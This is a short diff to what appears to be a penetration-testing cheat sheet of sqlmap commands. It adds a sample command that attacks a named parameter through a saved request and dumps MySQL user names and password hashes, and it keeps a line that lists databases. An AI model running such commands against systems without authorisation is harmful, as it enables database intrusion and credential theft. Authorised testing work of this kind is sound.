@@ -1,3 +1,6 @@
+#Sample Command
+sqlmap -r sqlfile -p paramToAttack --dbms mysql --users --passwords --batch --technique=QT --not-string=SQL-ERR --flush-session
+
 #List databases
 sqlmap -r sqlfile --batch  --dbs
 
